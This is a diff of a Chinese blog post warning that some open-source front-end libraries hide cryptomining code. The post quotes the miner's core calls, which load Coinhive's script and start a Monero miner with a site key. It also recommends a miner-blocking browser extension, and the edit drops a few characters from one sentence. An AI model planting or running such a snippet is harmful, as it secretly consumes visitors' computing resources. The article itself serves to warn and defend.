@@ -52,9 +52,12 @@ if (!_("head").data('x')) {
 }
 ```
  仔细看这个代码会发现这竟然是一串挖矿代码！！！会去请求接口:`https://coinhive.com/lib/coinhive.min.js`，然后执行`new CoinHive.Anonymous('GGdPGhxIloldaArArQVwxZ2sd8l0a4kH', {throttle: 0.3}).start();`开始挖矿，在网上找到了，这是**门罗币的挖矿代码**。具体可以看看下面这篇文章：
- > JS挖矿 - 门罗币是如何利用网页挖矿的？
-> （http://liujinkai.com/2017/10/28/js-miner/）
- 现在很多开源的框架、插件、库，使用起来都要小心，一不小心就中了别人的圈套，挖矿这种事是牺牲用户体验的基础上进行的，可以看到cpu使用飙升，电脑发烫，所以如果在你为了你的网站优化用户体验的时候，发现怎么优化都无济于事，记得找一找你引用代码里面有哪些隐藏的圈套。
+JS挖矿 - 门罗币是如何利用网页挖矿的？（http://liujinkai.com/2017/10/28/js-miner/）
+
+
+现在很多开源的框架、插件、库，使用起来都要小心，一不小心就中了别人的圈套，挖这种事是牺牲用户体验的基础上进行的，可以看到cpu使用飙升，电脑发烫，所以如果你为了你的网站优化用户体验的时候，发现怎么优化都无济于事，记得找一找你引用代里面有哪些隐藏的圈套。
+
+
 最后推荐一下chrome阻止挖矿的插件**minerBlock**
  ![Image5.png](https://meetsup.oss-cn-hangzhou.aliyuncs.com/blog-images/article23/Image5.png)
  最后，这篇文章投稿了**前端早读课**：[链接](https://mp.weixin.qq.com/s/fLGaVR-F8hFtZmHMFaNB4A)
